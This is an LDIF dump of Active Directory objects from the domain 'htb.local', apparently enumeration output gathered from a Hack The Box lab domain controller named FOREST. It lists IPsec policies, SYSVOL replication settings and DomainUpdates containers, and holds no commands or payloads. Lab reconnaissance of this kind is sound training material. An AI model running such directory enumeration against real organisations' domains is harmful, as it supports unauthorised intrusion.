# ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5921
uSNChanged: 5921
showInAdvancedViewOnly: TRUE
name: ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: cbwipp1NzU6Ue8wc/FIJMg==
ipsecID: {59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-
 ACE8-0060B0ECCA17},CN=IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}
description: Permit unsecure ICMP packets to pass through.
distinguishedName: CN=ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5923
uSNChanged: 5923
showInAdvancedViewOnly: TRUE
name: ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}
objectGUID:: VDib+JKuBECuGm4BoPWM5Q==
ipsecName: Permit unsecure ICMP packets to pass through.
ipsecID: {594272FD-071D-11D3-AD22-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: AKy7EY1J0RGGOQCgJI0wISoAAAABAAAABQAAAAIAAAAAAP3///8CAAAAAAAAAAAAAA
 AAAAEAAAACAAAAAAAA
ipsecOwnersReference: CN=ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
ipsecNegotiationPolicyReference: CN=ipsecNegotiationPolicy{7238523B-70FA-11D1-
 864C-14A300000000},CN=IP Security,CN=System,DC=htb,DC=local
ipsecFilterReference: CN=ipsecFilter{72385235-70FA-11D1-864C-14A300000000},CN=
 IP Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}
description: Accepts unsecured communication, but always requires clients to e
 stablish trust and security methods.  Will NOT communicate with untrusted cli
 ents.
distinguishedName: CN=ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000
 000},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5928
uSNChanged: 5928
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}
objectGUID:: iI3qzMHuEkyHwGeIUqYjDQ==
ipsecName: Require Security
ipsecID: {7238523F-70FA-11D1-864C-14A300000000}
ipsecDataType: 598
ipsecData:: 
 5ADIALQAA
ipsecOwnersReference: CN=ipsecNFA{7238523E-70FA-11D1-864C-14A300000000},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E10-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {3F91A81A-7647-11D1-864D-D46A00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}, IP Security, Sy
 stem, htb.local
dn: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP Secu
 rity,CN=System,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNegotiationPolicy
cn: ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
distinguishedName: CN=ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECC
 A17},CN=IP Security,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5925
uSNChanged: 5925
showInAdvancedViewOnly: TRUE
name: ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
objectGUID:: xGCrcIvv/EWM/yYjQViNYw==
ipsecID: {59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: 
ipsecOwnersReference: CN=ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17},CN=IP 
 Security,CN=System,DC=htb,DC=local
objectCategory: CN=Ipsec-Negotiation-Policy,CN=Schema,CN=Configuration,DC=htb,
 DC=local
isCriticalSystemObject: TRUE
iPSECNegotiationPolicyType: {62F49E13-6C37-11D1-864C-14A300000000}
iPSECNegotiationPolicyAction: {8A171DD3-77E3-11D1-8659-A04F00000000}
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}, IP Security, System, htb.loca
 l
dn: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Security,CN=System
 ,DC=htb,DC=local
objectClass: top
objectClass: ipsecBase
objectClass: ipsecNFA
cn: ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
description: Version Information Object
distinguishedName: CN=ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17},CN=IP Sec
 urity,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 5922
uSNChanged: 5922
showInAdvancedViewOnly: TRUE
name: ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
objectGUID:: Hn2ZNRlaCUaNJDij/+xF8Q==
ipsecName: Version Information Object
ipsecID: {6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
ipsecDataType: 598
ipsecData:: b1wfardy0hGs8ABgsOzKF1AAAAAAAAEApmamNhoAAABXAGkAbgBkAG8AdwBzACAAMg
 AwADAAMAAAABwAAABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAAAABgAAAA0ACgAAAACsuxGNSdE
 RhjkAoCSNMCEqAAAAAQAAAAUAAAACAAAAAAD9////AgAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAA==
objectCategory: CN=Ipsec-NFA,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# DFSR-GlobalSettings, System, htb.local
dn: CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-GlobalSettings
cn: DFSR-GlobalSettings
distinguishedName: CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12571
uSNChanged: 12572
showInAdvancedViewOnly: TRUE
name: DFSR-GlobalSettings
objectGUID:: V3jH4dSEGU2iB3yaWyQFlw==
objectCategory: CN=ms-DFSR-GlobalSettings,CN=Schema,CN=Configuration,DC=htb,DC
 =local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-Flags: 48

# Domain System Volume, DFSR-GlobalSettings, System, htb.local
dn: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-ReplicationGroup
cn: Domain System Volume
distinguishedName: CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC
 =htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12573
uSNChanged: 12573
showInAdvancedViewOnly: TRUE
name: Domain System Volume
objectGUID:: cAo/grdkV0SiEede3jRcUg==
objectCategory: CN=ms-DFSR-ReplicationGroup,CN=Schema,CN=Configuration,DC=htb,
 DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-ReplicationGroupType: 1

# Content, Domain System Volume, DFSR-GlobalSettings, System, htb.local
dn: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=htb
 ,DC=local
objectClass: top
objectClass: msDFSR-Content
cn: Content
distinguishedName: CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,C
 N=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12574
uSNChanged: 12574
showInAdvancedViewOnly: TRUE
name: Content
objectGUID:: zKQMqTOCPkOEDSUqtz/qNw==
objectCategory: CN=ms-DFSR-Content,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# SYSVOL Share, Content, Domain System Volume, DFSR-GlobalSettings, System, htb
 .local
dn: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-GlobalSettings,
 CN=System,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-ContentSet
cn: SYSVOL Share
distinguishedName: CN=SYSVOL Share,CN=Content,CN=Domain System Volume,CN=DFSR-
 GlobalSettings,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12575
uSNChanged: 12575
showInAdvancedViewOnly: TRUE
name: SYSVOL Share
objectGUID:: aNkH8z85DkOMOG6IVjHVfw==
objectCategory: CN=ms-DFSR-ContentSet,CN=Schema,CN=Configuration,DC=htb,DC=loc
 al
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-FileFilter: ~*,*.TMP,*.BAK
msDFSR-DirectoryFilter: DO_NOT_REMOVE_NtFrs_PreInstall_Directory,NtFrs_PreExis
 ting___See_EventLog

# Topology, Domain System Volume, DFSR-GlobalSettings, System, htb.local
dn: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=ht
 b,DC=local
objectClass: top
objectClass: msDFSR-Topology
cn: Topology
distinguishedName: CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,
 CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12576
uSNChanged: 12576
showInAdvancedViewOnly: TRUE
name: Topology
objectGUID:: KCfDzUQL+ECEU9Xs/1PJsA==
objectCategory: CN=ms-DFSR-Topology,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# FOREST, Topology, Domain System Volume, DFSR-GlobalSettings, System, htb.loca
 l
dn: CN=FOREST,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=Sy
 stem,DC=htb,DC=local
objectClass: top
objectClass: msDFSR-Member
cn: FOREST
distinguishedName: CN=FOREST,CN=Topology,CN=Domain System Volume,CN=DFSR-Globa
 lSettings,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105853.0Z
whenChanged: 20190918105853.0Z
uSNCreated: 12579
uSNChanged: 12579
showInAdvancedViewOnly: TRUE
name: FOREST
objectGUID:: 7Vn9hHjETkGpRH31WIMA1g==
serverReference: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=htb,DC=local
objectCategory: CN=ms-DFSR-Member,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z
msDFSR-ComputerReference: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
msDFSR-MemberReferenceBL: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FOR
 EST,OU=Domain Controllers,DC=htb,DC=local

# AdminSDHolder, System, htb.local
dn: CN=AdminSDHolder,CN=System,DC=htb,DC=local

# ComPartitions, System, htb.local
dn: CN=ComPartitions,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ComPartitions
distinguishedName: CN=ComPartitions,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5933
uSNChanged: 94580
showInAdvancedViewOnly: TRUE
name: ComPartitions
objectGUID:: N85C5LW7+UOglZId4OvF2w==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# ComPartitionSets, System, htb.local
dn: CN=ComPartitionSets,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ComPartitionSets
distinguishedName: CN=ComPartitionSets,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5934
uSNChanged: 94583
showInAdvancedViewOnly: TRUE
name: ComPartitionSets
objectGUID:: PQGleypSYkuNSUsOokez4w==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# WMIPolicy, System, htb.local
dn: CN=WMIPolicy,CN=System,DC=htb,DC=local

# DomainUpdates, System, htb.local
dn: CN=DomainUpdates,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: DomainUpdates
distinguishedName: CN=DomainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5940
uSNChanged: 94595
showInAdvancedViewOnly: TRUE
name: DomainUpdates
objectGUID:: tt6oYLEFPEmMHh2PHTLWcQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124637.0Z
dSCorePropagationData: 16010101000000.0Z

# Operations, DomainUpdates, System, htb.local
dn: CN=Operations,CN=DomainUpdates,CN=System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Operations
distinguishedName: CN=Operations,CN=DomainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5941
uSNChanged: 94598
showInAdvancedViewOnly: TRUE
name: Operations
objectGUID:: pG28AAaJSkelbmdLNSHo/w==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6E157EDF-4E72-4052-A82A-EC3F91021A22, Operations, DomainUpdates, System, htb.
 local
dn: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6E157EDF-4E72-4052-A82A-EC3F91021A22
distinguishedName: CN=6E157EDF-4E72-4052-A82A-EC3F91021A22,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918105323.0Z
whenChanged: 20190918105323.0Z
uSNCreated: 12397
uSNChanged: 12397
showInAdvancedViewOnly: TRUE
name: 6E157EDF-4E72-4052-A82A-EC3F91021A22
objectGUID:: gJ30+KVEIUGx+zRDd1vtFQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# ab402345-d3c3-455d-9ff7-40268a1099b6, Operations, DomainUpdates, System, htb.
 local
dn: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: ab402345-d3c3-455d-9ff7-40268a1099b6
distinguishedName: CN=ab402345-d3c3-455d-9ff7-40268a1099b6,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5942
uSNChanged: 94604
showInAdvancedViewOnly: TRUE
name: ab402345-d3c3-455d-9ff7-40268a1099b6
objectGUID:: 0+zBkmxGN0yFrFKZUKFdCQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# bab5f54d-06c8-48de-9b87-d78b796564e4, Operations, DomainUpdates, System, htb.
 local
dn: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: bab5f54d-06c8-48de-9b87-d78b796564e4
distinguishedName: CN=bab5f54d-06c8-48de-9b87-d78b796564e4,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5943
uSNChanged: 94607
showInAdvancedViewOnly: TRUE
name: bab5f54d-06c8-48de-9b87-d78b796564e4
objectGUID:: rZcnZYo/FUOFz9b60q9qIg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5, Operations, DomainUpdates, System, htb.
 local
dn: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
distinguishedName: CN=f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5944
uSNChanged: 94610
showInAdvancedViewOnly: TRUE
name: f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
objectGUID:: a0eyMjZsekiUrQF7zIisgQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 2416c60a-fe15-4d7a-a61e-dffd5df864d3, Operations, DomainUpdates, System, htb.
 local
dn: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
distinguishedName: CN=2416c60a-fe15-4d7a-a61e-dffd5df864d3,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5945
uSNChanged: 94613
showInAdvancedViewOnly: TRUE
name: 2416c60a-fe15-4d7a-a61e-dffd5df864d3
objectGUID:: yI4LlHrHqkKmek6n1tjEmQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 7868d4c8-ac41-4e05-b401-776280e8e9f1, Operations, DomainUpdates, System, htb.
 local
dn: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 7868d4c8-ac41-4e05-b401-776280e8e9f1
distinguishedName: CN=7868d4c8-ac41-4e05-b401-776280e8e9f1,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5946
uSNChanged: 94616
showInAdvancedViewOnly: TRUE
name: 7868d4c8-ac41-4e05-b401-776280e8e9f1
objectGUID:: +S6Jmj6rWU6QWqSi/SyVAw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 860c36ed-5241-4c62-a18b-cf6ff9994173, Operations, DomainUpdates, System, htb.
 local
dn: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 860c36ed-5241-4c62-a18b-cf6ff9994173
distinguishedName: CN=860c36ed-5241-4c62-a18b-cf6ff9994173,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5947
uSNChanged: 94619
showInAdvancedViewOnly: TRUE
name: 860c36ed-5241-4c62-a18b-cf6ff9994173
objectGUID:: 3Rg69GgGmEyeAXkZ+A7xwg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e, Operations, DomainUpdates, System, htb.
 local
dn: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
distinguishedName: CN=0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5948
uSNChanged: 94622
showInAdvancedViewOnly: TRUE
name: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
objectGUID:: 2NiyNcoEfUaDbPwimi1YaQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# a86fe12a-0f62-4e2a-b271-d27f601f8182, Operations, DomainUpdates, System, htb.
 local
dn: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: a86fe12a-0f62-4e2a-b271-d27f601f8182
distinguishedName: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5949
uSNChanged: 94625
showInAdvancedViewOnly: TRUE
name: a86fe12a-0f62-4e2a-b271-d27f601f8182
objectGUID:: wAwoo1GBbUCqRdCmub6EFQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# d85c0bfd-094f-4cad-a2b5-82ac9268475d, Operations, DomainUpdates, System, htb.
 local
dn: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: d85c0bfd-094f-4cad-a2b5-82ac9268475d
distinguishedName: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5950
uSNChanged: 94628
showInAdvancedViewOnly: TRUE
name: d85c0bfd-094f-4cad-a2b5-82ac9268475d
objectGUID:: 8bRDkVmTzki4GnABsJM7zQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

# 6ada9ff7-c9df-45c1-908e-9fef2fab008a, Operations, DomainUpdates, System, htb.
 local
dn: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=DomainUpdates,CN=
 System,DC=htb,DC=local
objectClass: top
objectClass: container
cn: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
distinguishedName: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225115.0Z
uSNCreated: 5951
uSNChanged: 94631
showInAdvancedViewOnly: TRUE
name: 6ada9ff7-c9df-45c1-908e-9fef2fab008a
objectGUID:: BiLEEb2s6UOk1aBHvFFYqA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 20201229124638.0Z
dSCorePropagationData: 16010101000000.0Z

